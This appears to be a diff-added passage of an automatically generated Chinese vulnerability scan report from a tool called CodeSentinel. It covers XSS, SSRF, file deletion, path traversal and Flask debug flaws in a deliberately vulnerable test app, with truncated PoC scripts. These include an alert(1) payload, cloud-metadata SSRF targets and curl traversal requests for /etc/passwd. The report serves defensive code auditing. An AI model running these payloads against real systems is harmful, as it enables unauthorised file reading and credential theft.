+                <p><strong>影响分析:</strong> 该XSS漏洞允许攻击者在受害者的浏览器中执行任意JavaScript代码。攻击者可以：1) 窃取用户的会话Cookie，导致账户劫持；2) 篡改页面内容，进行钓鱼攻击；3) 重定向用户到恶意网站；4) 执行任意操作（如发起CSRF攻击）；5) 窃取敏感信息（如表单输入、页面内容等）。由于漏洞存在于Flask应用中，且render_template_string默认不进行HTML转义，攻击者可以完全控制注入的JavaScript代码执行环境。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for XSS Vulnerability (VULN-B0030498)
+仅供研究使用 - 请勿用于非法用途
+&quot;&quot;&quot;
+
+import requests
+import sys
+
+# 目标URL（默认本地测试）
+TARGET_URL = &quot;http://localhost:8080/hello&quot;
+
+def test_xss_basic():
+    &quot;&quot;&quot;
+    测试1: 基础XSS - 弹出警告框
+    利用方式: 注入&lt;script&gt;alert(1)&lt;/script&gt;
+    &quot;&quot;&quot;
+    print(&quot;[*] 测试1: 基础XSS - alert(1)&quot;)
+    payload = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;
+    url = f&quot;{TARGET_U</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-66254213 - 服务端请求伪造(SSRF)</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:123</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>resp = requests.get(url, timeout=5)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;url&#x27;)获取，直接传递给requests.get()发起HTTP请求</p>
+                <p><strong>判断理由:</strong> 未对用户提供的URL进行任何白名单校验或限制。攻击者可利用此漏洞访问内部网络资源，如http://169.254.169.254/获取云服务元数据</p>
+                <p><strong>影响分析:</strong> 该SSRF漏洞允许攻击者利用服务器发起任意HTTP请求，造成以下严重影响：1) 访问云服务元数据（如AWS的169.254.169.254），获取临时凭证和敏感信息；2) 扫描和攻击内部网络服务（Redis、MySQL、Elasticsearch等），可能导致数据泄露或远程代码执行；3) 使用file://协议读取服务器本地文件（如/etc/passwd、应用配置文件等）；4) 绕过防火墙访问内部管理接口；5) 利用服务器作为跳板发起进一步攻击。在云环境中，此漏洞通常可直接导致云服务凭证泄露，造成严重的数据安全事件。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+SSRF漏洞PoC - 仅供安全研究使用
+目标: tests/vulnerable_app.py 中的 /fetch 路由
+&quot;&quot;&quot;
+
+import requests
+import sys
+
+# 目标应用地址
+TARGET_BASE = &quot;http://localhost:8080&quot;
+
+def test_ssrf_external():
+    &quot;&quot;&quot;测试1: 外部URL访问（正常功能）&quot;&quot;&quot;
+    print(&quot;[*] 测试1: 外部URL访问&quot;)
+    url = f&quot;{TARGET_BASE}/fetch?url=https://httpbin.org/get&quot;
+    try:
+        resp = requests.get(url, timeout=5)
+        print(f&quot;    [+] 状态码: {resp.s</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-44116E32 - 危险文件操作</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:133</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>os.remove(path)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;path&#x27;)获取，直接传递给os.remove()删除文件</p>
+                <p><strong>判断理由:</strong> 未对用户提供的路径做任何校验，攻击者可删除任意系统文件，导致拒绝服务或系统破坏</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 任意文件删除，包括系统关键配置文件（如/etc/passwd、/etc/shadow）、应用配置文件、日志文件等；2) 拒绝服务攻击，通过删除应用依赖的文件或系统关键文件导致服务不可用；3) 权限提升，通过删除特定安全配置文件绕过访问控制；4) 数据丢失，删除用户数据文件造成不可逆损失。在Windows系统上，可删除系统文件导致系统崩溃。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 危险文件操作漏洞利用
+漏洞ID: VULN-44116E32
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import requests
+import os
+import tempfile
+
+# 目标应用地址
+TARGET_URL = &quot;http://localhost:8080&quot;
+
+print(&quot;=&quot; * 60)
+print(&quot;PoC: 危险文件操作漏洞利用&quot;)
+print(&quot;漏洞ID: VULN-44116E32&quot;)
+print(&quot;仅供安全研究使用&quot;)
+print(&quot;=&quot; * 60)
+
+# ============================================
+# PoC 1: 删除临时文件（无害演示）
+# ============================================
+def poc_delete_temp_f</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-06AA9F17 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> web\app.py:113</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>@app.route(&quot;/report/&lt;path:report_path&gt;&quot;)
+def view_report(report_path):
+    full_path = os.path.join(os.path.dirname(__file__), &quot;..&quot;, &quot;reports&quot;, report_path)
+    if os.path.exists(full_path):
+        return send_file(full_path)
+    return &quot;报告未找到&quot;, 404</code></pre>
+                <p><strong>数据流:</strong> 用户通过URL路径参数report_path传入 -&gt; 直接拼接到full_path中 -&gt; 传递给send_file()发送文件</p>
+                <p><strong>判断理由:</strong> report_path参数直接来自用户请求URL，未进行任何路径校验或过滤。攻击者可以通过构造包含&#x27;../&#x27;的路径来访问reports目录之外的文件，例如访问/etc/passwd或项目中的敏感文件。虽然使用了os.path.join，但用户输入中的&#x27;../&#x27;仍可导致路径逃逸。</p>
+                <p><strong>影响分析:</strong> 该路径遍历漏洞允许攻击者读取Web服务器上的任意文件，包括但不限于：系统配置文件（/etc/passwd、/etc/shadow）、应用源代码、数据库文件、密钥文件、环境变量文件等。攻击者可以利用这些信息进一步攻击系统，如获取数据库凭据、SSH密钥、API密钥等敏感信息。在Windows系统上，可以读取SAM文件、注册表文件等。该漏洞可能导致整个系统被完全攻陷。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 路径遍历漏洞PoC
+# 目标：http://target:5000/report/&lt;path&gt;
+
+# PoC 1: 读取 /etc/passwd (Linux系统)
+echo &quot;PoC 1: 读取 /etc/passwd&quot;
+curl -v &quot;http://target:5000/report/../../../../etc/passwd&quot;
+
+# PoC 2: 读取 Windows系统文件 (如C:\Windows\win.ini)
+echo &quot;PoC 2: 读取 Windows系统文件&quot;
+curl -v &quot;http://target:5000/report/../../../../Windows/win.ini&quot;
+
+# PoC 3: 读取项目敏感文件 (如config/settings.py)
+echo &quot;PoC 3: 读取项目配置文件&quot;
+curl -v &quot;http://target:5000/report/../con</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-88BF1858 - 不安全的配置</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> web\app.py:127</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>app.run(
+    host=WEB_CONFIG.get(&quot;host&quot;, &quot;127.0.0.1&quot;),
+    port=WEB_CONFIG.get(&quot;port&quot;, 5000),
+    debug=WEB_CONFIG.get(&quot;debug&quot;, False),
+)</code></pre>
+                <p><strong>数据流:</strong> 从config.settings导入WEB_CONFIG -&gt; 直接用于app.run配置</p>
+                <p><strong>判断理由:</strong> 如果WEB_CONFIG中的debug设置为True，Flask会启用调试模式，可能暴露详细的错误信息和调试控制台，导致信息泄露或远程代码执行。此外，如果host设置为0.0.0.0，应用会监听所有网络接口，增加攻击面。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者：1) 通过调试控制台执行任意Python代码，实现远程代码执行；2) 如果应用监听0.0.0.0，可以从任何网络接口访问，增加攻击面；3) 调试模式会暴露详细的错误信息，可能泄露敏感数据（如数据库密码、API密钥等）；4) 攻击者可以利用调试控制台完全控制服务器，执行系统命令、读取文件、植入后门等。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+&quot;&quot;&quot;
+PoC for VULN-88BF1858 - Flask不安全配置漏洞
+仅供安全研究使用，请勿用于非法用途
+&quot;&quot;&quot;
+
+import requests
+import sys
+import time
+
+# ============================================
+# PoC 1: 检测调试模式是否开启
+# ============================================
+def check_debug_mode(target_url):
+    &quot;&quot;&quot;
+    检测Flask调试模式是否开启
+    通过访问不存在的路由触发404错误，观察是否返回调试信息
+    &quot;&quot;&quot;
+    print(&quot;[*] 正在检测调试模式...&quot;)
+    
+    # 访问一个不存在的路由
+    test_ur</code></pre></details>
+            </div>
+
+    <hr>
+    <p style="color:#666;font-size:0.9em;">报告由 CodeSentinel 自动生成 | 2026-07-08 22:08:31</p>
+</div>
+</body>
+</html>
